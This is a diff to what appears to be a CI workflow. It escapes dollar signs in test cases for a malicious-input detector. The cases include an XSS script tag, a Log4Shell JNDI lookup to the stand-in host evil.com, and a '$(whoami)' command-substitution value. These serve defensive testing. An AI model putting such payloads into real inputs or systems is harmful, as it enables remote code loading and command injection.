@@ -182,8 +182,8 @@ jobs:
         test_cases = [
             ('<script>alert(1)</script>', True),
             ('Normal text', False),
-            ('${jndi:ldap://evil.com}', True),
-            ('$(whoami)', True),
+            ('\${jndi:ldap://evil.com}', True),
+            ('\$(whoami)', True),
             ('Regular domain.com', False),
             (chr(0) + chr(1) + chr(2), True)  # Control characters
         ]
